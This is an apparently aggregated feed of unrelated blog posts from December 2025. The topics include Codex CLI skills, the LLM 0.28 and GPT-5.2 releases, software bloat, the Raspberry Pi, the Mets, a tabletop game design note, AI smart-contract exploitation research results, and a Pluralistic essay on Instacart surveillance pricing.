<pre><code>cd /tmp
mkdir datasette-cowsay
cd datasette-cowsay
codex --enable skills -m gpt-5.2
</code></pre>
<p>Then prompted:</p>
<blockquote>
<p><code>list skills</code></p>
</blockquote>
<p>And Codex replied:</p>
<blockquote>
<p><code>- datasette-plugins — Writing Datasette plugins using Python + pluggy (file: /Users/simon/.codex/skills/datasette-plugin/SKILL.md)</code></p>
<p><code>- Discovery — How to find/identify available skills (no SKILL.md path provided in the list)</code></p>
</blockquote>
<p>Then I said:</p>
<blockquote>
<p><code>Write a Datasette plugin in this folder adding a /-/cowsay?text=hello page that displays a pre with cowsay from PyPI saying that text</code></p>
</blockquote>
<p>It worked perfectly! Here's <a href="https://github.com/simonw/datasette-cowsay">the plugin code it wrote</a> and here's <a href="http://gistpreview.github.io/?96ee928370b18eabc2e0fad9aaa46d4b">a copy of the full Codex CLI transcript</a>, generated with my <a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/">terminal-to-html tool</a>.</p>
<p>You can try that out yourself if you have <code>uvx</code> installed like this:</p>
<pre><code>uvx --with https://github.com/simonw/datasette-cowsay/archive/refs/heads/main.zip \
  datasette
</code></pre>
<p>Then visit:</p>
<pre><code>http://127.0.0.1:8001/-/cowsay?text=This+is+pretty+fun

</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/cowsay-datasette.jpg" alt="Screenshot of that URL in Firefox, an ASCII art cow says This is pretty fun."></p>
<h4>Skills are a keeper</h4>
<p>When I first wrote about skills in October I said <a href="https://simonwillison.net/2025/Oct/16/claude-skills/">Claude Skills are awesome, maybe a bigger deal than MCP</a>. The fact that it's just turned December and OpenAI have already leaned into them in a big way reinforces to me that I called that one correctly.</p>
<p>Skills are based on a <em>very</em> light specification, if you could even call it that, but I still think it would be good for these to be formally documented somewhere. This could be a good initiative for the new <a href="https://aaif.io/">Agentic AI Foundation</a> ( <a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/">previously</a>) to take on.</p>

      <h1>What's the point of lightweight code with modern computers?</h1>

(date: 2025-12-12)
      <p>
      <p>I think there are many.</p>
<p>Some examples:</p>
<p>\* The fastest code is the code you don't run.</p>
<p>Smaller = faster, and we all want faster. Moore's law is over, Dennard scaling isn't affordable any more, smaller feature sizes are getting absurdly difficult and therefore expensive to fab. So if we want our computers to keep getting faster as we've got used to over the last 40-50 years then the only way to keep delivering that will be to start ruthlessly optimising, shrinking, finding more efficient ways to implement what we've got used to.</p>
<p>Smaller systems are better for performance.</p>
<p>\* The smaller the code, the less there is to go wrong.</p>
<p>Smaller doesn't just mean faster, it should mean simpler and cleaner too. Less to go wrong. Easier to debug. Wrappers and VMs and bytecodes and runtimes are bad: they make life easier but they are less efficient and make issues harder to troubleshoot. Part of the Unix philosophy is to embed the KISS principle.</p>
<p>So that's performance and troubleshooting. We aren't done.</p>
<p>\* The less you run, the smaller the attack surface.</p>
<p>Smaller code and less code means fewer APIs, fewer interfaces, less points of failure. Look at djb's decades-long policy of offering rewards to people who find holes in qmail or djbdns. Look at OpenBSD. We all need better more secure code. Smaller simpler systems built from fewer layers means more security, less attack surface, less to audit.</p>
<p>Higher performance, and easier troubleshooting, and better security. There's 3 reasons.</p>
<p>Practical examples...</p>
<p>The Atom editor spawned an entire class of app: Electron apps, Javascript on Node, bundled with Chromium. Slack, Discord, VSCode: there are multiple apps used by tens to hundreds of millions of people now. Look at how vast they are. Balena Etcher is a, what, nearly 100 MB download to write an image to USB? Native apps like Rufus do it in a few megabytes. Smaller ones like USBimager do it in hundreds of kilobytes. A dd command in under 100 bytes.</p>
<p>Now some of the people behind Atom wrote Zed.</p>
<p>It's 10% of the size and 10x the speed, in part because it's a native Rust app.</p>
<p>The COSMIC desktop looks like GNOME, works like GNOME Shell, but it's smaller and faster and more customisable because it's native Rust code.</p>
<p>GNOME Shell is Javascript running on an embedded copy of Mozilla's Javascript runtime.</p>
<p>Just like dotcoms wanted to dis-intermediate business, remove middlemen and distributors for faster sales, we could use disintermediation in our software. Fewer runtimes, better smarter compiled languages so we can trap more errors and have faster <em>and</em> safer compiled native code.</p>
<p>Smaller, simpler, cleaner, fewer layers, less abstractions: these are all <em>goods things</em> which are <em>desirable</em>.</p>
<p>Dennis Ritchie and Ken Thompson knew this. That's why Research Unix evolved into Plan 9, which puts way more stuff through the filesystem to remove whole types of API. Everything's in a container all the time, the filesystem abstracts the network and the GUI and more. Under 10% of the syscalls of Linux, the kernel is 5MB of source, and yet it has much of Kubernetes in there.</p>
<p>Then they went further, replaced C too, made a simpler safer language, embedded its runtime right into the kernel, and made binaries CPU-independent, and turned the entire network-aware OS into a runtime to compete with the JVM, so it could run as a browser plugin as well as a bare-metal OS. Now we have ubiquitous virtualisation so lean into it: separate domains. If your user-facing OS only runs in a VM then it doesn't need a filesystem or hardware drivers, because it won't see hardware, only virtualised facilities, so rip all that stuff out. Your container host doesn't need to have a console or manage disks.</p>
<p>This is what we should be doing. This is what we need to do. Hack away at the code complexity. Don't add functionality, remove it. Simplify it. Enforce standards by putting them in the kernel and removing dozens of overlapping implementations. Make codebases that are smaller and readable by humans.</p>
<p>Leave the vast bloated stuff to commercial companies and proprietary software where nobody gets to read it except LLM bots anyway.</p>

      <p>I have no context for <a href="https://www.reddit.com/r/interestingasfuck/comments/1pg0ujj/new_rare_footage_of_a_live_giant_squid_caught/">this video</a>—it’s from Reddit—but one of the commenters adds some context:</p>
<blockquote>
<p>Hey everyone, squid biologist here! Wanted to add some stuff you might find interesting.</p>
<p>With so many people carrying around cameras, we’re getting more videos of giant squid at the surface than in previous decades. We’re also starting to notice a pattern, that around this time of year (peaking in January) we see a bunch of giant squid around Japan. We don’t know why this is happening. Maybe they gather around there to mate or something? who knows! but since so many people have cameras, those one-off monster-story encounters are now caught on video, like this one (which, btw, rips. This squid looks so healthy, it’s awesome)...</p>

      <p><strong><a href="https://llm.datasette.io/en/stable/changelog.html#v0-28">LLM 0.28</a></strong></p>
<p>I released a new version of my <a href="https://llm.datasette.io/">LLM</a> Python library and CLI tool for interacting with Large Language Models. Highlights from the release notes:</p>
<blockquote>
<ul>
<li>New OpenAI models: <code>gpt-5.1</code>, <code>gpt-5.1-chat-latest</code>, <code>gpt-5.2</code> and <code>gpt-5.2-chat-latest</code>. <a href="https://github.com/simonw/llm/issues/1300">#1300</a>, <a href="https://github.com/simonw/llm/issues/1317">#1317</a></li>
<li>When fetching URLs as fragments using <code>llm -f URL</code>, the request now includes a custom user-agent header: <code>llm/VERSION (https://llm.datasette.io/)</code>. <a href="https://github.com/simonw/llm/issues/1309">#1309</a></li>
<li>Fixed a bug where fragments were not correctly registered with their source when using <code>llm chat</code>. Thanks, <a href="https://github.com/grota">Giuseppe Rota</a>. <a href="https://github.com/simonw/llm/pull/1316">#1316</a></li>
<li>Fixed some file descriptor leak warnings. Thanks, <a href="https://github.com/eedeebee">Eric Bloch</a>. <a href="https://github.com/simonw/llm/issues/1313">#1313</a></li>
<li>Type annotations for the OpenAI Chat, AsyncChat and Completion <code>execute()</code> methods. Thanks, <a href="https://github.com/ar-jan">Arjan Mossel</a>. <a href="https://github.com/simonw/llm/pull/1315">#1315</a></li>
<li>The project now uses <code>uv</code> and dependency groups for development. See the updated <a href="https://llm.datasette.io/en/stable/contributing.html">contributing documentation</a>. <a href="https://github.com/simonw/llm/issues/1318">#1318</a></li>
</ul>
</blockquote>
<p>That last bullet point about <code>uv</code> relates to the dependency groups pattern I <a href="https://til.simonwillison.net/uv/dependency-groups">wrote about in a recent TIL</a>. I'm currently working through applying it to my other projects - the net result is that running the test suite is as simple as doing:</p>
<pre><code>git clone https://github.com/simonw/llm
cd llm
uv run pytest

</code></pre>
<p>The new <code>dev</code> dependency group <a href="https://github.com/simonw/llm/blob/0.28/pyproject.toml#L44-L69">defined in pyproject.toml</a> is automatically installed by <code>uv run</code> in a new virtual environment which means everything needed to run <code>pytest</code> is available without needing to add any extra commands.</p>

      <h1>The Mets' soul walks out the door</h1>

(date: 2025-12-12)
      <p>
      <p>As a lifelong Mets fan since 1962, I say <a href="https://apnews.com/article/mets-alonso-diaz-nimmo-stearns-cohen-212636702fdf04efc0889c36a53a88e1">they blew it</a>. And if you follow my sports writing here, mostly about the Knicks and Mets, I almost never say a team was wrong. I can usually see a pro and a con to everything. WIth the Mets, I let the team run itself, and ponder the philosophical intentions and manifestations, because to me the Mets are the team built on philosophy. It certainly was not built on winning. And yet we love them. There's no winning in life, that's reality. So we try to find meaning on the days and hours we have remaining. And the Mets are great teachers, as are the Knicks.</p>
<p>Anyway -- why did the Mets have such a shit season?</p>
<p>Because they disrespected <a href="https://en.wikipedia.org/wiki/Pete_Alonso">Pete Alonso</a> last winter.</p>
<p>He should have been the glue that held the team together along with Nimmo, Diaz, and all the other much-loved players.</p>
<p>We still think of <a href="https://en.wikipedia.org/wiki/Francisco_Lindor">Lindor</a> as the new guy. Now all you have left for leadership is Lindor and Soto who obviously doesn't even want to be there. It's was a broken team before the news, and now it's not even a team.</p>
<p>A team isn't a bunch of stats and a bunch of money, it's the players, the people. You can't solve this problem with a spreadsheet, it has to be done with heart. These days I think of the Mets just trying to be the Yankees which aside from being impossible, is pretty much the exact reason we're Mets fans and not Yankees fans. Ohhh, when will they learn. I don't want a team built to win the World Series. I want a team built to respect the team.</p>
<p>And btw, the big news was they traded Nimmo, and let Alonso and Diaz sign with other teams.</p>

I'm not being funny or sarcastic, I mean it. They already had a mechanism for deciding who matters. And the software they used could have been employed by all the other pubs, and anyone else. What I'm describing is the alternate reality where the Twitter founders followed the WordPress model. They might not be worth billions, but they certainly would have <a href="http://scripting.com/davenet/2000/10/19/transcendentalMoney.html">far more money</a> than one person can use.

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/raspberry-pi-cm0.jpeg" alt="Raspberry Pi CM0"></p>
<p>This little postage stamp is actually a full Raspberry Pi Zero 2, complete with eMMC storage and WiFi.</p>
<p>But you can't get one. Well, not unless you buy the <a href="https://edatec.cn/docs/cm0nano/ds/">CM0NANO development board from EDAtec</a>, or you live in China.</p>
<p>This little guy doesn't have an HDMI port, Ethernet, or even USB. It's a special version of the 'Compute Module' line of boards. Little Raspberry Pi 'System on Modules' (SoMs), they're called.</p>
<p>Compute Modules are entire Linux computers about the size of a regular desktop CPU that you 'plug in' to another board, to give it life.</p>

      <p>I wonder if the VCs would fund an entirely fictitious implementation of Twitter with AI of course. All the other people are AI designed actors, and can be exactly the kind of people who make <em>you</em> feel good. On &quot;Your Own Twitter&quot; you'd have the most followers of anyone. Elon Musk would kiss your ass. You could change reality at will, have Trump removed from office and watch the MAGAs wail in pain. You could say absolutely whatever you like and never be cancelled. Don't laugh, I bet this happens.</p>

<p>GPT-5.2 is available via their UI in both &quot;instant&quot; and &quot;thinking&quot; modes, presumably still corresponding to the API concept of different reasoning effort levels.</p>
<p>The knowledge cut-off date for both variants is now <strong>August 31st 2025</strong>. This is significant - GPT 5.1 and 5 were both Sep 30, 2024 and GPT-5 mini was May 31, 2024.</p>
<p>Both of the 5.2 models have a 400,000 token context window and 128,000 max output tokens - no different from 5.1 or 5.</p>
<p>Pricing wise 5.2 is a rare <em>increase</em> - it's 1.4x the cost of GPT 5.1, at <span class="math inline">\(1.75/million input and \)</span>14/million output. GPT-5.2 Pro is <span class="math inline">\(21.00/million input and a hefty \)</span>168.00/million output, putting it <a href="https://www.llm-prices.com/#sel=gpt-4.5%2Co1-pro%2Cgpt-5.2-pro">up there</a> with their previous most expensive models o1 Pro and GPT-4.5.</p>
<p>So far the main benchmark results we have are self-reported by OpenAI. The most interesting ones are a 70.9% score on their GDPval &quot;Knowledge work tasks&quot; benchmark (GPT-5 got 38.8%) and a 52.9% on ARC-AGI-2 (up from 17.6% for GPT-5.1 Thinking).</p>
<p>The ARC Prize Twitter account provided <a href="https://x.com/arcprize/status/1999182732845547795">this interesting note</a> on the efficiency gains for GPT-5.2 Pro</p>
<blockquote>
<p>A year ago, we verified a preview of an unreleased version of @OpenAI
o3 (High) that scored 88% on ARC-AGI-1 at est. $4.5k/task</p>
<p>Today, we’ve verified a new GPT-5.2 Pro (X-High) SOTA score of 90.5% at $11.64/task</p>
<p>This represents a ~390X efficiency improvement in one year</p>
</blockquote>
<p>GPT-5.2 can be accessed in OpenAI's Codex CLI tool like this:</p>
<pre><code>codex -m gpt-5.2

</code></pre>
<p>There are three new API models:</p>
<ul>
<li><a href="https://platform.openai.com/docs/models/gpt-5.2">gpt-5.2</a> - I think this is what you get if you select &quot;GPT-5.2 Thinking&quot; in ChatGPT but <a href="https://twitter.com/simonw/status/1999603339382976785">I'm a little confused</a>.</li>
<li><a href="https://platform.openai.com/docs/models/gpt-5.2-chat-latest">gpt-5.2-chat-latest</a> - the model used by ChatGPT for &quot;GPT-5.2 Instant&quot; mode. It's priced the same as GPT-5.2 but has a reduced 128,000 context window with 16,384 max output tokens.</li>
<li><a href="https://platform.openai.com/docs/models/gpt-5.2-pro">gpt-5.2-pro</a></li>
</ul>
<p>OpenAI have published a new <a href="https://cookbook.openai.com/examples/gpt-5/gpt-5-2_prompting_guide">GPT-5.2 Prompting Guide</a>. An interesting note from that document is that compaction can now be run with <a href="https://platform.openai.com/docs/api-reference/responses/compact">a new dedicated server-side API</a>:</p>
<blockquote>
<p>For long-running, tool-heavy workflows that exceed the standard context window, GPT-5.2 with Reasoning supports response compaction via the <code>/responses/compact</code> endpoint. Compaction performs a loss-aware compression pass over prior conversation state, returning encrypted, opaque items that preserve task-relevant information while dramatically reducing token footprint. This allows the model to continue reasoning across extended workflows without hitting context limits.</p>
</blockquote>
<h4>It's better at vision</h4>
<p>One note from the announcement that caught my eye:</p>
<blockquote>
<p>GPT‑5.2 Thinking is our strongest vision model yet, cutting error rates roughly in half on chart reasoning and software interface understanding.</p>
</blockquote>
<p>I had <a href="https://simonwillison.net/2025/Aug/29/the-perils-of-vibe-coding/">disappointing results from GPT-5</a> on an OCR task a while ago. I tried it against GPT-5.2 and it did <em>much</em> better:</p>
<pre><code>llm -m gpt-5.2 ocr -a https://static.simonwillison.net/static/2025/ft.jpeg
</code></pre>
<p>Here's <a href="https://gist.github.com/simonw/b4a13f1e424e58b8b0aca72ae2c3cb00">the result</a> from that, which cost 1,520 input and 1,022 for a total of <a href="https://www.llm-prices.com/#it=1520&amp;ot=1022&amp;sel=gpt-5.2">1.6968 cents</a>.</p>
<h4>Rendering some pelicans</h4>
<p>For my classic &quot;Generate an SVG of a pelican riding a bicycle&quot; test:</p>
<pre><code>llm -m gpt-5.2 &quot;Generate an SVG of a pelican riding a bicycle&quot;
</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/gpt-2.5-pelican.png" alt="Described by GPT-5.2: Cartoon-style illustration: A white, duck-like bird with a small black eye, oversized orange beak (with a pale blue highlight along the lower edge), and a pink neckerchief rides a blue-framed bicycle in side view; the bike has two large black wheels with gray spokes, a blue front fork, visible black crank/pedal area, and thin black handlebar lines, with gray motion streaks and a soft gray shadow under the bike on a light-gray road; background is a pale blue sky with a simple yellow sun at upper left and two rounded white clouds (one near upper center-left and one near upper right)."></p>
<p>And for the more advanced alternative test, which tests instruction following in a little more depth:</p>
<pre><code>llm -m gpt-5.2 &quot;Generate an SVG of a California brown pelican riding a bicycle. The bicycle
must have spokes and a correctly shaped bicycle frame. The pelican must have its
characteristic large pouch, and there should be a clear indication of feathers.
The pelican must be clearly pedaling the bicycle. The image should show the full
breeding plumage of the California brown pelican.&quot;
</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/gpt-5.2-p2.png" alt="Digital illustration on a light gray/white background with a thin horizontal baseline: a stylized California brown pelican in breeding plumage is drawn side-on, leaning forward and pedaling a bicycle; the pelican has a dark brown body with layered wing lines, a pale cream head with a darker brown cap and neck shading, a small black eye, and an oversized long golden-yellow bill extending far past the front wheel; one brown leg reaches down to a pedal while the other is tucked back; the bike is shown in profile with two large spoked wheels (black tires, white rims), a dark frame, crank and chainring near the rear wheel, a black saddle above the rear, and the front fork aligned under the pelican’s head; text at the top reads &quot;California brown pelican (breeding plumage) pedaling a bicycle&quot;."></p>
<p><strong>Update 14th December 2025</strong>: I used GPT-5.2 running in Codex CLI to <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">port a complex Python library to JavaScript</a>. It ran without interference for nearly four hours and completed a complex task exactly to my specification.</p>

<p>Now that <a href="https://www.jeffgeerling.com/blog/2025/nvidia-graphics-cards-work-on-pi-5-and-rockchip">Nvidia GPUs run on the Raspberry Pi</a>, I've been putting all the ones I own through their paces.</p>
<p>Many people have an older Nvidia card (like a 3060) laying around from an upgrade. So could a Pi be suitable for GPU-accelerated video transcoding, either standalone for conversion, or running something like Jellyfin for video library management and streaming?</p>
<p>That's what I set out to do, and the first step, besides getting the drivers and CUDA going (see blog post linked above), was to find a way to get a repeatable benchmark going.</p>

      <h1>2025-12-11 Status in Kinetic Energy</h1>

(date: 2025-12-11)
      <p>
      <h1>2025-12-11 Status in Kinetic Energy</h1>
<p>I think I need to write something about how I want to use Status. My <a href="Kinetic_Energy">Kinetic Energy</a> game has it, just like Traveller. And I also have the empire, and techno feudalism. I want to emphasise the terrible feudal aspects of this and encourage the game to be about the struggle against it. In this context, Status is your standing and social capital within the empire. How many friends in high places you have, how much favours you can call in, like the Resources test in Burning Wheel. Now, if you are exposed as a rebel, you can still pull strings but some things must necessarily change. And clearly, if you leave the empire completely, then your Status there drops to the minimum (1): You have become a stranger, a refugee. Or we could say: There is a new Status attribute for every hegemony. The default is simply: Your status within the empire.</p>
<p>I think this matches what I wrote <a href="2025-11-25-first-session">a few days ago</a>:</p>
<blockquote>
<p>Status 7 is what I would consider an honest citizen of the empire. The axis is important. Outside the empire, your status would immediately drop and it would take a lifetime to get back up. … Status-10 is close to nobility. So who is close to nobility? People useful to the empire. People working in their administration, close to the court; friends of young nobles who were talented but sadly lacked the right connections. There is that class ceiling. No matter how hard you try: you can get a good job but you can never stop working.</p>
</blockquote>
<p>Treating Status as your family connections and your network of influence is also why it also doesn’t make sense to “increase” your Status as you level up. I guess if you marry into the imperial family, one could say that increases your status. Or perhaps your status stays the same. After all, your partner married a provincial nobody! But your children might have a better status. Now that would be a cool Pendragon-Traveller cross-over.</p>
<p>That reminds me of a line in <a href="Knives">Knives</a> where I have a section called <em>The Next Generation</em>:</p>
<blockquote>
<p>When creating characters that are children of other characters, do not roll for Education or Status. Instead, children inherit Education and Status from their parents …</p>
</blockquote>
<p>In Knives, I said “up to a maximum of 7” but for Kinetic Energy I think what should happen is you “usually” get the education of your parents (sadly true in Switzerland), let’s do a kind of “flux” roll: your parent’s Education +1d6 -1d6. And maybe the average of your parent’s Status, rounded up?</p>

      <h1>AIs Exploiting Smart Contracts</h1>

(date: 2025-12-11)
      <p>
      <p>I have long maintained that smart contracts are a dumb idea: that a human process is actually a security feature.</p>
<p>Here’s some <a href="https://red.anthropic.com/2025/smart-contracts/">interesting research</a> on training AIs to automatically exploit smart contracts:</p>
<blockquote>
<p>AI models are increasingly good at cyber tasks, as we’ve <a href="https://red.anthropic.com/2025/ai-for-cyber-defenders/">written about before</a>. But what is the economic impact of these capabilities? In a recent <a href="https://www.matsprogram.org/">MATS</a> and Anthropic Fellows project, our scholars investigated this question by evaluating AI agents’ ability to exploit smart contracts on <a href="https://github.com/safety-research/SmartContract-bench">Smart CONtracts Exploitation benchmark (SCONE-bench)</a> ­a new benchmark they built comprising 405 contracts that were actually exploited between 2020 and 2025. On contracts exploited after the latest knowledge cutoffs (June 2025 for Opus 4.5 and March 2025 for other models), Claude Opus 4.5, Claude Sonnet 4.5, and GPT-5 developed exploits collectively worth <span class="math inline">\(4.6 million, establishing a concrete lower bound for the economic harm these capabilities could enable. Going beyond retrospective analysis, we evaluated both Sonnet 4.5 and GPT-5 in simulation against 2,849 recently deployed contracts without any known vulnerabilities. Both agents uncovered two novel zero-day vulnerabilities and produced exploits worth \)</span>3,694, with GPT-5 doing so at an API cost of $3,476. This demonstrates as a proof-of-concept that profitable, real-world autonomous exploitation is technically feasible, a finding that underscores the need for proactive adoption of AI for defense...</p>

      <p>The <a href="https://newrepublic.com/article/204271/why-democrats-lost-2024-election-trump-way-to-win-report">real reason</a> the Dems lost in 2024 is they ran the most inept campaign in history. You could argue about who was to blame, but that is, net-net what happened. They were so bad they made Trump look better! And that is hard to do. :-)</p>

      <h1>Pluralistic: Instacart reaches into your pocket and lops a third off your dollars (11 Dec 2025)</h1>

(date: 2025-12-11)
      <p>
      <p>Today's links Instacart reaches into your pocket and lops a third off your dollars: A/B splitting your way into doing a total fucking racism. Hey look at this: Delights to delectate. Object permanence: Predicting the present; Caller eye-deer; RIP Robert Sheckley; Student protesters and Google Maps vs kettling; If your kids like computers, they're criminals; A billion CC licenses; The moral character of cryptographic work; EC resurrects link-taxes. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Instacart reaches into your pocket and lops a third off your dollars (permalink) There's a whole greedflation-denial cottage industry that insists that rising prices are either the result of unknowable, untameable and mysterious economic forces, or they're the result of workers having too much money and too many jobs. The one thing we're absolutely not allowed to talk about is the fact that CEOs keep going on earnings calls to announce that they are hiking prices way ahead of any increase in their costs, and blaming inflation: <a href="https://pluralistic.net/2021/11/20/quiet-part-out-loud/#profiteering">https://pluralistic.net/2021/11/20/quiet-part-out-loud/#profiteering</a> Nor are we supposed to notice the &quot;price consultancies&quot; that let the dominant firms in many sectors – from potatoes to meat to rental housing – fix prices in illegal collusive arrangements that are figleafed by the tissue-thin excuse that &quot;if you use an app to fix prices, it's not a crime&quot;: <a href="https://pluralistic.net/2025/01/25/potatotrac/#carbo-loading">https://pluralistic.net/2025/01/25/potatotrac/#carbo-loading</a> And we're especially not supposed to notice the proliferation of &quot;personalized pricing&quot; businesses that use surveillance data to figure out how desperate you are and charge you a premium based on that desperation: <a href="https://pluralistic.net/2024/06/05/your-price-named/#privacy-first-again">https://pluralistic.net/2024/06/05/your-price-named/#privacy-first-again</a> Surveillance pricing – when you are charged more for the same goods than someone else, based on surveillance data about the urgency of your need and the cash in your bank account – is a way for companies to reach into your pocket and devalue the dollars in your wallet. After all, if you pay <span class="math inline">\(2 for something that I pay \)</span>1 for, that's just the company saying that your dollars are only worth half as much as mine: <a href="https://pluralistic.net/2025/06/24/price-discrimination/">https://pluralistic.net/2025/06/24/price-discrimination/</a> It's a form of cod-Marxism: &quot;from each according to their desperation&quot;: <a href="https://pluralistic.net/2025/01/11/socialism-for-the-wealthy/#rugged-individualism-for-the-poor">https://pluralistic.net/2025/01/11/socialism-for-the-wealthy/#rugged-individualism-for-the-poor</a> The economy is riddled with surveillance pricing gouging. You are almost certainly paying more than your neighbors for various items, based on algorithmic price-setting, every day. Case in point: More Perfect Union and Groundwork Collaborative teamed up with Consumer Reports to recruit 437 volunteers from across America to log in to Instacart at the same time and buy the same items from 15 stores, and found evidence of surveillance pricing at Albertsons, Costco, Kroger, and Sprouts Farmers Market: <a href="https://groundworkcollaborative.org/work/instacart/">https://groundworkcollaborative.org/work/instacart/</a> The price-swings are wild. Some test subjects are being charged 23% more than others. The average variance for &quot;the exact same items, from the exact same locations, at the exact same time&quot; comes out to 7%, or &quot;<span class="math inline">\(1,200 per year for groceries" for a family of four. The process by which your greedflation premium is assigned is opaque. The researchers found that Instacart shoppers ordering from Target clustered into seven groups, but it's not clear how Instacart decides how much extra to charge any given shopper. Instacart – who acquired Eversight, a surveillance pricing company, in 2022 – blamed the merchants (who, in turn, blamed Instacart). Instacart also claimed that they didn't use surveillance data to price goods, but hedged, admitting that the consumer packaged goods duopoly of Unilever and Procter & Gamble do use surveillance data in connection with their pricing strategies. Finally, Instacart claimed that this was all an "experiment" to "learn what matters most to consumers and how to keep essential items affordable." In other words, they were secretly charging you more (for things like eggs and bread) because somehow that lets them "keep essential items affordable." Instacart said their goal was to help "retail partners understand consumer preferences and identify categories where they should invest in lower prices." Anyone who's done online analytics can easily pierce this obfuscation, but for those of you who haven't had the misfortune of directing an iterated, A/B tested optimization effort, I'll unpack this statement. Say you have a pool of users and a bunch of variations on a headline. You randomly assign different variants to different users and measure clickthroughs. Then you check to see which variants performed best, and dig into the data you have on those users to see if there are any correlations that tie together users who liked a given approach. This might let you discover that, say, women over 40 click more often on headlines that mention kittens. Then you generate more variations based on these conclusions – different ways of mentioning kittens – and see which of these variations perform best, and whether the targeted group of users split into smaller subgroups (women over 40 in the midwest prefer "tabby kitten" while their southern sisters prefer "kitten" without a mention of breed). By repeatedly iterating over these steps, you can come up with many highly refined variants, and you can use surveillance data to target them to ever narrower, more optimized slices of your user-base. Obviously, this is very labor intensive. You have to do a lot of tedious analysis, and generate a lot of variants. This is one of the reasons that slopvertising is so exciting to the worst people on earth: they imagine that they can use AI to create a self-licking ice-cream cone, performing the analysis and generating endless new variations, all untouched by human hands. But when it comes to prices, it's much easier to produce variants – all you're doing is adding or subtracting from the price you show to shoppers. You don't need to get the writing team together to come up with new ways of mentioning kittens in a headline – you can just raise the price from \)</span>6.23 to <span class="math inline">\(6.45 and see if midwestern women over 40 balk or add the item to their shopping baskets. And here's the kicker: you don't need to select by gender, racial or economic criteria to end up with a super-racist and exploitative arrangement. That's because race, gender and socioeconomic status have broad correlates that are easily discoverable through automated means. For example, thanks to generations of redlining, discriminatory housing policy, wage discrimination and environmental racism, the poorest, sickest neighborhoods in the country are also the most racialized and are also most likely to be "food deserts" where you can't just go to the grocery store and shop for your family. What's more, the private equity-backed dollar store duopoly have waged a decades-long war on community grocery stores, enveloping them with dollar stores that use their access to preferential discounts (from companies like Unilever and Procter & Gamble, another duopoly) to force grocers out of business: https://pluralistic.net/2023/03/27/walmarts-jackals/#cheater-sizes Then these dollar stores run a greedflation scam that is so primitive, it's almost laughable: they just charge customers much higher amounts than the prices shown on the shelves and price-tags: https://www.consumeraffairs.com/news/do-all-those-low-dollar-store-prices-really-add-up-120325.html When you live in a food desert where your only store is a Dollar General that defrauds you at the cash-register, you are more likely to accept a higher price from Instacart, because you have fewer choices than someone in a middle-class neighborhood with two or three competing grocers. And the people who live in those food deserts are more likely to be poor, which, in America, is an excellent predictor of whether they are Black or brown. Which is to say, without ever saying "Charge Black people more for groceries," Instacart can easily A/B split its way into a system where they predictably and reliably charge Black people more for groceries. That's the old cod-Marxism at work: "from each according to their desperation." This is so well-understood that anyone who sets one of these systems in motion should be understood to be deliberately seeking to do racist profiteering under cover of an algorithm. It's empiricism-washing: "I'm not racist, I just did some math" (that produced a predictably racist outcome): https://www.reuters.com/article/world/insight-amazon-scraps-secret-ai-recruiting-tool-that-showed-bias-against-women-idUSKCN1MK0AG/ This is the dark side and true meaning of "business optimization." The optimal business pays its suppliers and workers nothing, and charges its customers everything it can. Obviously, businesses need to settle for suboptimal outcomes, because workers won't show up if they don't get paid, and customers won't buy things that cost everything they have⹋. ⹋ Unless, of course, you are an academic publisher, in which case this is just how you do business. A business "optimizes" its workforce by finding ways to get them to accept lower wages. For example, they can bind their workers with noncompete "agreements" that ban Wendy's cashiers from quitting their job and making \)</span>0.25 more per hour at the McDonald's next door (one in 18 American workers have been locked into one of these contracts): <a href="https://pluralistic.net/2025/09/09/germanium-valley/#i-cant-quit-you">https://pluralistic.net/2025/09/09/germanium-valley/#i-cant-quit-you</a> Or they can lock their workers in with &quot;training repayment agreement provisions&quot; (TRAPs) – contractual clauses that force workers to pay their bosses thousands of dollars if they quit or get fired: <a href="https://pluralistic.net/2022/08/04/its-a-trap/#a-little-on-the-nose">https://pluralistic.net/2022/08/04/its-a-trap/#a-little-on-the-nose</a> But the most insidious form of worker optimization is &quot;algorithmic wage discrimination.&quot; That's when a company uses surveillance data to lower the wages of workers. For example, contract nurses are paid less if the app that hires them discovers (through the unregulated data-broker sector) that they have a lot of credit-card debt. After all, nurses who are heavily indebted can't afford to be choosy and turn down lowball offers: <a href="https://pluralistic.net/2024/12/18/loose-flapping-ends/#luigi-has-a-point">https://pluralistic.net/2024/12/18/loose-flapping-ends/#luigi-has-a-point</a> This is the other form of surveillance pricing: pricing labor based on surveillance data. It's more cod-Marxism: &quot;From each according to their desperation.&quot; Forget &quot;becoming ungovernable&quot;: to defeat these evil fuckers, we have to become unoptimizable: <a href="https://pluralistic.net/2025/08/20/billionaireism/#surveillance-infantalism">https://pluralistic.net/2025/08/20/billionaireism/#surveillance-infantalism</a> How do we do that? Well, nearly every form of &quot;optimization&quot; begins with surveillance. They can't figure out whether they can charge you more if they can't spy on you. They can't figure out whether they can pay you less if they can't spy on you, either. And the reason they can spy on you is because we let them. The last consumer privacy law to pass out of Congress was a 1988 bill that bans video-store clerks from disclosing your VHS rental history. Every other form of consumer surveillance is permitted under US federal law. So step one of this process is to ban commercial surveillance. Banning algorithmic price discrimination is all well and good, but it is, ultimately, a form of redistribution. We're trying to make the companies share some of the excess they extract from our surveillance data. But predistribution – ending surveillance itself, in this case – is always far more effective than redistribution: <a href="https://pluralistic.net/2025/10/31/losing-the-crypto-wars/#surveillance-monopolism">https://pluralistic.net/2025/10/31/losing-the-crypto-wars/#surveillance-monopolism</a> How do we do that? Well, we need to build a coalition. At the Electronic Frontier Foundation, we call this &quot;privacy first&quot;: you can't solve all the internet's problems by fixing privacy, but you won't fix most of them unless we get privacy right, and so the (potential) coalition for a strong privacy regime is large and powerful: <a href="https://pluralistic.net/2023/12/06/privacy-first/#but-not-just-privacy">https://pluralistic.net/2023/12/06/privacy-first/#but-not-just-privacy</a> But of course, &quot;privacy first,&quot; doesn't mean &quot;just privacy.&quot; We also need tools that target algorithmic pricing per se. In New York State, there's a new law that requires disclosure of algorithmic pricing, in the form of a prominent notification reading, &quot;THIS PRICE WAS SET BY AN ALGORITHM USING YOUR PERSONAL DATA.&quot; This is 